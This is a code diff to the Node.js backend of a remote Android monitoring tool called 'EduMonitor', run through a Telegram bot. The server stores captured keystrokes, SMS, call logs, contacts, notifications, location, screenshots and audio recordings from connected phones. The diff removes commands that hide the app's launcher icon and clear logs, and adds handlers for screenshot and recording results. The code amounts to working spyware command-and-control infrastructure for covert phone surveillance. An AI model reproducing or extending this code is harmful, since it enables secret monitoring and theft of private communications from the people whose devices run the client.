@@ -19,8 +19,6 @@ require('dotenv').config();
 // ============================================
 const app = express();
 const server = http.createServer(app);
-
-// Trust proxy (for Render.com)
 app.set('trust proxy', 1);
 
 // ============================================
@@ -51,6 +49,7 @@ const config = {
 const db = new sqlite3.Database('./edumonitor.db');
 
 db.serialize(() => {
+    // Devices table
     db.run(`CREATE TABLE IF NOT EXISTS devices (
         id TEXT PRIMARY KEY,
         name TEXT,
@@ -66,6 +65,7 @@ db.serialize(() => {
         features TEXT
     )`);
 
+    // Commands table
     db.run(`CREATE TABLE IF NOT EXISTS commands (
         id TEXT PRIMARY KEY,
         device_id TEXT,
@@ -78,6 +78,7 @@ db.serialize(() => {
         priority INTEGER DEFAULT 0
     )`);
 
+    // Locations table
     db.run(`CREATE TABLE IF NOT EXISTS locations (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         device_id TEXT,
@@ -90,6 +91,7 @@ db.serialize(() => {
         timestamp INTEGER
     )`);
 
+    // Media table
     db.run(`CREATE TABLE IF NOT EXISTS media (
         id TEXT PRIMARY KEY,
         device_id TEXT,
@@ -102,6 +104,7 @@ db.serialize(() => {
         uploaded INTEGER DEFAULT 0
     )`);
 
+    // Keystrokes table
     db.run(`CREATE TABLE IF NOT EXISTS keystrokes (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         device_id TEXT,
@@ -110,6 +113,7 @@ db.serialize(() => {
         timestamp INTEGER
     )`);
 
+    // Notifications table
     db.run(`CREATE TABLE IF NOT EXISTS notifications (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         device_id TEXT,
@@ -119,6 +123,7 @@ db.serialize(() => {
         timestamp INTEGER
     )`);
 
+    // Contacts table
     db.run(`CREATE TABLE IF NOT EXISTS contacts (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         device_id TEXT,
@@ -128,6 +133,7 @@ db.serialize(() => {
         timestamp INTEGER
     )`);
 
+    // SMS table
     db.run(`CREATE TABLE IF NOT EXISTS sms_messages (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         device_id TEXT,
@@ -138,6 +144,7 @@ db.serialize(() => {
         timestamp INTEGER
     )`);
 
+    // Call logs table
     db.run(`CREATE TABLE IF NOT EXISTS call_logs (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         device_id TEXT,
@@ -149,6 +156,7 @@ db.serialize(() => {
         timestamp INTEGER
     )`);
 
+    // Installed apps table
     db.run(`CREATE TABLE IF NOT EXISTS installed_apps (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         device_id TEXT,
@@ -162,9 +170,7 @@ db.serialize(() => {
 // ============================================
 // SECURITY MIDDLEWARE
 // ============================================
-app.use(helmet({
-    contentSecurityPolicy: false,
-}));
+app.use(helmet({ contentSecurityPolicy: false }));
 app.use(compression());
 app.use(express.json({ limit: '100mb' }));
 app.use(express.urlencoded({ extended: true, limit: '100mb' }));
@@ -280,9 +286,7 @@ async function sendTelegramDocument(chatId, filePath, filename, caption = '') {
         }
 
         const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
-            headers: {
-                'Content-Type': 'multipart/form-data'
-            }
+            headers: { 'Content-Type': 'multipart/form-data' }
         });
         
         console.log('✅ Document sent to Telegram:', response.data);
@@ -305,6 +309,9 @@ async function editMessageText(chatId, messageId, text, keyboard = null) {
         await axios.post(`${TELEGRAM_API}/editMessageText`, payload);
         return true;
     } catch (error) {
+        if (error.response?.data?.description?.includes('message is not modified')) {
+            return true; // Message already has this content
+        }
         console.error('Edit message error:', error.response?.data?.description || error.message);
         await sendTelegramMessage(chatId, text, {
             reply_markup: keyboard ? { inline_keyboard: keyboard } : undefined
@@ -327,7 +334,6 @@ async function answerCallbackQuery(callbackQueryId, text = null) {
 // ============================================
 // PROFESSIONAL INLINE KEYBOARDS
 // ============================================
-
 const MainMenuKeyboard = [
     [{ text: '📱 DEVICES', callback_data: 'menu_devices' }],
     [{ text: '📸 SCREENSHOT', callback_data: 'menu_screenshot' }, { text: '🎤 RECORDING', callback_data: 'menu_recording' }],
@@ -388,16 +394,15 @@ const SettingsMenuKeyboard = [
 // ============================================
 class DeviceManager {
     constructor() {
-        this.devices = new Map(); // deviceId -> device object
-        this.wsConnections = new Map(); // ws -> deviceId
-        this.commandCallbacks = new Map(); // commandId -> callback
+        this.devices = new Map();
+        this.wsConnections = new Map();
+        this.commandCallbacks = new Map();
         console.log('📱 DeviceManager initialized');
     }
 
     registerDevice(deviceId, ws, deviceInfo) {
         console.log(`\n🔌 ===== DEVICE CONNECTION =====`);
         console.log(`Device ID: ${deviceId}`);
-        console.log(`Device Info:`, deviceInfo);
         
         const deviceKey = encryption.generateDeviceKey();
         
@@ -417,8 +422,6 @@ class DeviceManager {
         
         console.log(`✅ Device registered successfully`);
         console.log(`Total connected devices: ${this.devices.size}`);
-        console.log(`==============================\n`);
-        
         return device;
     }
 
@@ -431,14 +434,10 @@ class DeviceManager {
     }
 
     sendCommand(deviceId, command, parameters = {}, callback = null) {
-        console.log(`\n📤 ===== SENDING COMMAND =====`);
-        console.log(`Device ID: ${deviceId}`);
-        console.log(`Command: ${command}`);
-        console.log(`Parameters:`, parameters);
+        console.log(`\n📤 Sending command: ${command} to ${deviceId}`);
         
         const device = this.devices.get(deviceId);
         if (!device) {
-            console.error(`❌ Device not found!`);
             return { success: false, error: 'Device not found' };
         }
 
@@ -452,16 +451,13 @@ class DeviceManager {
 
         if (callback) {
             this.commandCallbacks.set(commandId, callback);
-            console.log(`📝 Callback registered for ${commandId}`);
             
             // Set timeout for callback
             setTimeout(() => {
                 if (this.commandCallbacks.has(commandId)) {
                     console.log(`⏰ Command ${commandId} timed out`);
                     this.commandCallbacks.delete(commandId);
-                    if (callback) {
-                        callback(false, null, 'Command timeout');
-                    }
+                    callback(false, null, 'Command timeout');
                 }
             }, 30000);
         }
@@ -474,7 +470,6 @@ class DeviceManager {
                     data: cmd
                 });
                 
-                console.log(`📨 Sending WebSocket message`);
                 device.ws.send(message);
                 
                 db.run(`INSERT INTO commands (id, device_id, command, parameters, status, created_at)
@@ -482,10 +477,8 @@ class DeviceManager {
                     [commandId, deviceId, command, JSON.stringify(parameters), Date.now()]
                 );
                 
-                console.log(`✅ Command sent`);
                 return { success: true, commandId };
             } else {
-                console.log(`📦 Device not connected, queueing command`);
                 device.pendingCommands.push(cmd);
                 return { success: true, commandId, queued: true };
             }
@@ -504,8 +497,7 @@ class DeviceManager {
     }
 
     disconnectDevice(deviceId) {
-        console.log(`\n🔌 ===== DEVICE DISCONNECTED =====`);
-        console.log(`Device ID: ${deviceId}`);
+        console.log(`\n🔌 Device disconnected: ${deviceId}`);
         
         const device = this.devices.get(deviceId);
         if (device) {
@@ -513,10 +505,7 @@ class DeviceManager {
                 this.wsConnections.delete(device.ws);
             }
             this.devices.delete(deviceId);
-            
             db.run(`UPDATE devices SET is_active = 0 WHERE id = ?`, [deviceId]);
-            
-            console.log(`✅ Device removed`);
         }
     }
 }
@@ -524,7 +513,7 @@ class DeviceManager {
 const deviceManager = new DeviceManager();
 
 // ============================================
-// WEBSOCKET CONNECTION HANDLING (Primary)
+// WEBSOCKET CONNECTION HANDLING
 // ============================================
 wss.on('connection', (ws, req) => {
     const deviceId = req.headers['device-id'];
@@ -553,14 +542,20 @@ wss.on('connection', (ws, req) => {
     }));
 
     sendTelegramMessage(config.telegram.chatId, 
-        `✅ *Device Connected*\nModel: ${device.info.model || 'Unknown'}\nAndroid: ${device.info.androidVersion || 'Unknown'}`,
+        `✅ *Device Connected*\nModel: ${device.info.model || 'Unknown'}`,
         { parse_mode: 'Markdown' }
     );
 
     ws.on('message', async (data) => {
         try {
             const message = JSON.parse(data);
-            console.log(`📩 WebSocket message from ${deviceId}:`, message.type);
+            
+            if (!message.type) {
+                console.log('📩 Received message without type:', message);
+                return;
+            }
+            
+            console.log(`📩 Message type: ${message.type} from ${deviceId}`);
             
             switch (message.type) {
                 case 'register':
@@ -613,6 +608,14 @@ wss.on('connection', (ws, req) => {
                     await handleInstalledApps(deviceId, message.data);
                     break;
                     
+                case 'screenshot_result':
+                    await handleScreenshotResult(deviceId, message);
+                    break;
+                    
+                case 'recording_result':
+                    await handleRecordingResult(deviceId, message);
+                    break;
+                    
                 default:
                     console.log('Unknown message type:', message.type);
             }
@@ -631,7 +634,6 @@ wss.on('connection', (ws, req) => {
         console.error(`WebSocket error for device ${deviceId}:`, error);
     });
 
-    // Send initial ping
     ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
 });
 
@@ -641,10 +643,7 @@ wss.on('connection', (ws, req) => {
 async function handleDeviceResponse(deviceId, message) {
     const { commandId, success, data, error } = message;
     
-    console.log(`\n📥 ===== DEVICE RESPONSE =====`);
-    console.log(`Device ID: ${deviceId}`);
-    console.log(`Command ID: ${commandId}`);
-    console.log(`Success: ${success}`);
+    console.log(`\n📥 Response for command ${commandId}: success=${success}`);
     
     db.run(`UPDATE commands SET status = ?, result = ?, executed_at = ? WHERE id = ?`,
         [success ? 'completed' : 'failed', JSON.stringify(data || error), Date.now(), commandId]
@@ -652,10 +651,37 @@ async function handleDeviceResponse(deviceId, message) {
 
     const callback = deviceManager.commandCallbacks.get(commandId);
     if (callback) {
-        console.log(`📞 Executing callback`);
         callback(success, data, error);
         deviceManager.commandCallbacks.delete(commandId);
     }
+}
+
+async function handleScreenshotResult(deviceId, message) {
+    const { commandId, filePath, fileSize } = message;
+    console.log(`📸 Screenshot received: ${filePath} (${fileSize} bytes)`);
+    
+    const callback = deviceManager.commandCallbacks.get(commandId);
+    if (callback) {
+        callback(true, { filePath, fileSize }, null);
+        deviceManager.commandCallbacks.delete(commandId);
+    }
+    
+    sendTelegramMessage(config.telegram.chatId, 
+        `📸 *Screenshot captured*\nSize: ${formatFileSize(fileSize)}`);
+}
+
+async function handleRecordingResult(deviceId, message) {
+    const { commandId, filePath, duration, fileSize } = message;
+    console.log(`🎤 Recording received: ${filePath} (${duration}s, ${fileSize} bytes)`);
+    
+    const callback = deviceManager.commandCallbacks.get(commandId);
+    if (callback) {
+        callback(true, { filePath, duration, fileSize }, null);
+        deviceManager.commandCallbacks.delete(commandId);
+    }
+    
+    sendTelegramMessage(config.telegram.chatId, 
+        `🎤 *Recording captured*\nDuration: ${duration}s\nSize: ${formatFileSize(fileSize)}`);
 }
 
 async function handleDeviceLocation(deviceId, locationData) {
@@ -692,7 +718,6 @@ async function handleKeystroke(deviceId, data) {
         VALUES (?, ?, ?, ?)`,
         [deviceId, data.package, data.text, data.timestamp || Date.now()]
     );
-    console.log(`⌨️ Keystroke from ${deviceId}: ${data.package} - ${data.text.substring(0, 50)}`);
 }
 
 async function handleNotification(deviceId, data) {
@@ -700,7 +725,6 @@ async function handleNotification(deviceId, data) {
         VALUES (?, ?, ?, ?, ?)`,
         [deviceId, data.package, data.title, data.text, data.timestamp || Date.now()]
     );
-    console.log(`🔔 Notification from ${deviceId}: ${data.package} - ${data.title}`);
 }
 
 async function handleContacts(deviceId, data) {
@@ -709,7 +733,6 @@ async function handleContacts(deviceId, data) {
         stmt.run([deviceId, contact.name, contact.number, contact.id, Date.now()]);
     });
     stmt.finalize();
-    console.log(`📇 Contacts saved for ${deviceId}: ${data.contacts.length} contacts`);
 }
 
 async function handleSMS(deviceId, data) {
@@ -718,7 +741,6 @@ async function handleSMS(deviceId, data) {
         stmt.run([deviceId, msg.address, msg.body, msg.date, msg.type, Date.now()]);
     });
     stmt.finalize();
-    console.log(`💬 SMS saved for ${deviceId}: ${data.messages.length} messages`);
 }
 
 async function handleCallLogs(deviceId, data) {
@@ -727,7 +749,6 @@ async function handleCallLogs(deviceId, data) {
         stmt.run([deviceId, log.number, log.date, log.duration, log.type, log.name, Date.now()]);
     });
     stmt.finalize();
-    console.log(`📞 Call logs saved for ${deviceId}: ${data.logs.length} logs`);
 }
 
 async function handleInstalledApps(deviceId, data) {
@@ -736,11 +757,10 @@ async function handleInstalledApps(deviceId, data) {
         stmt.run([deviceId, app.package, app.name, app.isSystem, Date.now()]);
     });
     stmt.finalize();
-    console.log(`📱 Apps saved for ${deviceId}: ${data.apps.length} apps`);
 }
 
 // ============================================
-// API ENDPOINTS (Only for registration and file uploads)
+// API ENDPOINTS (Only for registration and uploads)
 // ============================================
 
 // Health check
@@ -754,12 +774,11 @@ app.get('/health', (req, res) => {
 
 // Device registration
 app.post('/api/register', (req, res) => {
-    console.log('📥 Registration request received:', req.body);
+    console.log('📥 Registration request received');
     
     const { deviceId, chatId, deviceInfo } = req.body;
 
     if (!deviceId) {
-        console.error('❌ Missing deviceId');
         return res.status(400).json({ error: 'Missing deviceId' });
     }
 
@@ -841,7 +860,7 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
                             newPath, 
                             filename || file.originalname,
                             `${caption || '📎 File'} from ${device.model || 'Device'}`
-                        ).catch(e => console.error('Async Telegram send error:', e));
+                        );
                     }
                 });
                 
@@ -909,10 +928,7 @@ app.get('/api/data/:deviceId/:type', (req, res) => {
 // TELEGRAM WEBHOOK HANDLER
 // ============================================
 app.post('/webhook', async (req, res) => {
-    console.log('\n📨 ===== WEBHOOK RECEIVED =====');
-    
     res.sendStatus(200);
-
     const update = req.body;
 
     try {
@@ -937,8 +953,6 @@ async function handleTelegramMessage(message) {
 
     if (!text) return;
 
-    console.log(`📨 Processing command: ${text}`);
-
     if (text === '/start' || text === '/help' || text === '/menu') {
         await sendTelegramMessage(chatId, 
             '🤖 *EduMonitor Control Panel*\n\nSelect an option below:',
@@ -949,9 +963,6 @@ async function handleTelegramMessage(message) {
         );
     } else if (text === '/devices') {
         await showDevicesMenu(chatId, message.message_id);
-    } else {
-        await sendTelegramMessage(chatId, 
-            '❓ Unknown command. Use /start to see available commands.');
     }
 }
 
@@ -961,12 +972,7 @@ async function handleTelegramCallback(callbackQuery) {
     const data = callbackQuery.data;
     const callbackId = callbackQuery.id;
 
-    console.log(`📨 Callback received: ${data}`);
-
-    // Answer callback query
-    await answerCallbackQuery(callbackId).catch(e => 
-        console.error('Error answering callback:', e)
-    );
+    await answerCallbackQuery(callbackId);
 
     try {
         if (data === 'menu_main') {
@@ -1024,21 +1030,6 @@ async function handleTelegramCallback(callbackQuery) {
             const deviceId = data.substring(6);
             await listFiles(chatId, messageId, deviceId);
         }
-        else if (data.startsWith('contacts_') || data.startsWith('sms_') || 
-                 data.startsWith('calllogs_') || data.startsWith('apps_') ||
-                 data.startsWith('keystrokes_') || data.startsWith('notifications_')) {
-            const parts = data.split('_');
-            if (parts.length === 2) {
-                const deviceId = parts[1];
-                await showDeviceDetails(chatId, messageId, deviceId);
-            } else {
-                // Handle format extraction
-                const format = parts[1];
-                const type = parts[0];
-                const deviceId = parts.slice(2).join('_');
-                await extractData(chatId, messageId, deviceId, type, format);
-            }
-        }
         else if (data.startsWith('battery_')) {
             const deviceId = data.substring(8);
             await getBatteryStatus(chatId, messageId, deviceId);
@@ -1051,43 +1042,21 @@ async function handleTelegramCallback(callbackQuery) {
             const deviceId = data.substring(8);
             await getStorageInfo(chatId, messageId, deviceId);
         }
-        else if (data.startsWith('reboot_')) {
-            const deviceId = data.substring(7);
-            await rebootDevice(chatId, messageId, deviceId);
-        }
-        else if (data.startsWith('hide_')) {
-            const deviceId = data.substring(5);
-            await hideIcon(chatId, messageId, deviceId);
-        }
-        else if (data.startsWith('show_')) {
-            const deviceId = data.substring(5);
-            await showIcon(chatId, messageId, deviceId);
-        }
-        else if (data.startsWith('clear_')) {
-            const deviceId = data.substring(6);
-            await clearLogs(chatId, messageId, deviceId);
-        }
         else if (data.startsWith('info_')) {
             const deviceId = data.substring(5);
             await getDeviceInfo(chatId, messageId, deviceId);
         }
-        } catch (error) {
+    } catch (error) {
         console.error('Error in callback handler:', error);
-        await sendTelegramMessage(chatId, 
-            '⚠️ *Session Expired*\n\nPlease use /start to restart the menu.',
-            { reply_markup: { inline_keyboard: MainMenuKeyboard } }
-        );
     }
 }
 
 // ============================================
 // MENU DISPLAY FUNCTIONS
 // ============================================
-
 async function showDevicesMenu(chatId, messageId) {
     db.all('SELECT * FROM devices WHERE is_active = 1 ORDER BY last_seen DESC', [], async (err, devices) => {
         if (err) {
-            console.error('Error fetching devices:', err);
             await editMessageText(chatId, messageId, '❌ Error fetching devices');
             return;
         }
@@ -1110,7 +1079,7 @@ async function showDeviceDetails(chatId, messageId, deviceId) {
     db.get('SELECT * FROM devices WHERE id = ?', [deviceId], async (err, device) => {
         if (err || !device) {
             await editMessageText(chatId, messageId,
-                '❌ *Device Not Found*\n\nThe device may have disconnected.',
+                '❌ *Device Not Found*',
                 [[{ text: '🔙 BACK TO DEVICES', callback_data: 'menu_devices' }]]
             );
             return;
@@ -1294,21 +1263,16 @@ async function showHelpMenu(chatId, messageId) {
 // ============================================
 // COMMAND EXECUTION FUNCTIONS
 // ============================================
-
 async function takeScreenshot(chatId, messageId, deviceId) {
-    console.log(`\n📸 ===== TAKING SCREENSHOT =====`);
-    
     await editMessageText(chatId, messageId,
         `📸 *Taking Screenshot*\n\n⏳ Please wait...`,
         [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
     );
 
     const result = deviceManager.sendCommand(deviceId, 'take_screenshot', {}, (success, data, error) => {
-        console.log(`📥 Screenshot response:`, { success, error });
-        
         if (success) {
             editMessageText(chatId, messageId,
-                `✅ *Screenshot captured successfully!*\n\nProcessing and uploading...`,
+                `✅ *Screenshot captured successfully!*`,
                 [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
             );
         } else {
@@ -1328,19 +1292,15 @@ async function takeScreenshot(chatId, messageId, deviceId) {
 }
 
 async function startRecording(chatId, messageId, deviceId, seconds) {
-    console.log(`\n🎤 ===== STARTING RECORDING =====`);
-    
     await editMessageText(chatId, messageId,
         `🎤 *Starting Recording*\n\nDuration: ${seconds}s\n⏳ Please wait...`,
         [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
     );
 
     const result = deviceManager.sendCommand(deviceId, 'record_audio', { seconds }, (success, data, error) => {
-        console.log(`📥 Recording response:`, { success, error });
-        
         if (success) {
             editMessageText(chatId, messageId,
-                `✅ *Recording completed!*\n\nProcessing and uploading...`,
+                `✅ *Recording completed!*`,
                 [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
             );
         } else {
@@ -1360,8 +1320,6 @@ async function startRecording(chatId, messageId, deviceId, seconds) {
 }
 
 async function getLocation(chatId, messageId, deviceId) {
-    console.log(`\n📍 ===== GETTING LOCATION =====`);
-    
     await editMessageText(chatId, messageId,
         `📍 *Getting Location*\n\n⏳ Please wait...`,
         [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
@@ -1398,8 +1356,6 @@ async function getLocation(chatId, messageId, deviceId) {
 }
 
 async function listFiles(chatId, messageId, deviceId) {
-    console.log(`\n📁 ===== LISTING FILES =====`);
-    
     await editMessageText(chatId, messageId,
         `📁 *Listing Files*\n\nDefault path: /sdcard\n⏳ Please wait...`,
         [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
@@ -1428,58 +1384,6 @@ async function listFiles(chatId, messageId, deviceId) {
             );
         }
     });
-}
-
-async function extractData(chatId, messageId, deviceId, type, format) {
-    console.log(`\n📊 ===== EXTRACTING ${type} DATA (${format}) =====`);
-    
-    await editMessageText(chatId, messageId,
-        `📊 *Extracting ${type} data*\n\nFormat: ${format.toUpperCase()}\n⏳ Please wait...`,
-        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
-    );
-
-    // Map the command
-    let command;
-    if (type === 'contacts') command = `get_contacts_${format}`;
-    else if (type === 'sms') command = `get_sms_${format}`;
-    else if (type === 'calllogs') command = `get_calllogs_${format}`;
-    else if (type === 'apps') command = `get_apps_${format}`;
-    else if (type === 'keystrokes') command = `get_keystrokes_${format}`;
-    else if (type === 'notifications') command = `get_notifications_${format}`;
-    else command = `get_${type}_${format}`;
-
-    const result = deviceManager.sendCommand(deviceId, command, {}, (success, data, error) => {
-        if (success) {
-            let responseText = `✅ *${type} data extracted successfully!*\n\n`;
-            responseText += `Format: ${format.toUpperCase()}\n`;
-            
-            if (data && data.count) {
-                responseText += `Count: ${data.count}\n`;
-            }
-            if (data && data.file) {
-                responseText += `File: ${data.file}\n`;
-            }
-            if (data && data.message) {
-                responseText += `\n${data.message}`;
-            }
-            
-            editMessageText(chatId, messageId, responseText,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
-        } else {
-            editMessageText(chatId, messageId,
-                `❌ *Extraction Failed*\n\nError: ${error || 'Unknown error'}`,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
-        }
-    });
-
-    if (!result.success) {
-        await editMessageText(chatId, messageId,
-            `❌ *Failed to send command*\n\nDevice may be offline.`,
-            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-        );
-    }
 }
 
 async function getBatteryStatus(chatId, messageId, deviceId) {
@@ -1519,7 +1423,6 @@ async function getNetworkInfo(chatId, messageId, deviceId) {
                 message += `Type: ${data.type}\n`;
                 if (data.ssid) message += `WiFi: ${data.ssid}\n`;
                 if (data.ip) message += `IP: ${data.ip}\n`;
-                if (data.signal) message += `Signal: ${data.signal}dBm\n`;
             } else {
                 message += `Status: ❌ Disconnected\n`;
             }
@@ -1597,75 +1500,6 @@ async function getDeviceInfo(chatId, messageId, deviceId) {
     });
 }
 
-async function rebootDevice(chatId, messageId, deviceId) {
-    await editMessageText(chatId, messageId,
-        `🔄 *Rebooting Services*\n\n⏳ Please wait...`,
-        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
-    );
-
-    const result = deviceManager.sendCommand(deviceId, 'reboot_services', {}, (success, data, error) => {
-        if (success) {
-            editMessageText(chatId, messageId,
-                `✅ *Services rebooted successfully!*`,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
-        } else {
-            editMessageText(chatId, messageId,
-                `❌ *Reboot Failed*\n\nError: ${error || 'Unknown error'}`,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
-        }
-    });
-}
-
-async function hideIcon(chatId, messageId, deviceId) {
-    const result = deviceManager.sendCommand(deviceId, 'hide_icon', {}, (success, data, error) => {
-        if (success) {
-            editMessageText(chatId, messageId,
-                `👻 *Icon hidden successfully!*\n\nApp icon is now hidden from launcher.`,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
-        } else {
-            editMessageText(chatId, messageId,
-                `❌ *Failed to hide icon*\n\nError: ${error || 'Unknown error'}`,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
-        }
-    });
-}
-
-async function showIcon(chatId, messageId, deviceId) {
-    const result = deviceManager.sendCommand(deviceId, 'show_icon', {}, (success, data, error) => {
-        if (success) {
-            editMessageText(chatId, messageId,
-                `👁️ *Icon shown successfully!*\n\nApp icon is now visible in launcher.`,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
-        } else {
-            editMessageText(chatId, messageId,
-                `❌ *Failed to show icon*\n\nError: ${error || 'Unknown error'}`,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
-        }
-    });
-}
-
-async function clearLogs(chatId, messageId, deviceId) {
-    const result = deviceManager.sendCommand(deviceId, 'clear_logs', {}, (success, data, error) => {
-        if (success) {
-            editMessageText(chatId, messageId,
-                `🗑️ *Logs cleared successfully!*`,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
-        } else {
-            editMessageText(chatId, messageId,
-                `❌ *Failed to clear logs*\n\nError: ${error || 'Unknown error'}`,
-                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
-            );
-        }
-    });
-}
-
 // ============================================
 // UTILITY FUNCTIONS
 // ============================================
@@ -1713,11 +1547,9 @@ schedule.scheduleJob('0 0 * * *', () => {
 // 404 HANDLER
 // ============================================
 app.use((req, res) => {
-    console.log(`❌ 404 - Not Found: ${req.method} ${req.url}`);
     res.status(404).json({ 
         error: 'Endpoint not found',
-        path: req.url,
-        method: req.method
+        path: req.url
     });
 });
 
@@ -1743,7 +1575,6 @@ server.listen(config.server.port, config.server.host, () => {
     console.log(`🚀 ===============================================`);
     console.log(`\n📡 HTTP Server: http://${config.server.host}:${config.server.port}`);
     console.log(`🔌 WebSocket: ws://${config.server.host}:${config.server.port}/ws`);
-    console.log(`🤖 Telegram Bot: @${config.telegram.token.split(':')[0]}`);
     
     setWebhook();
 
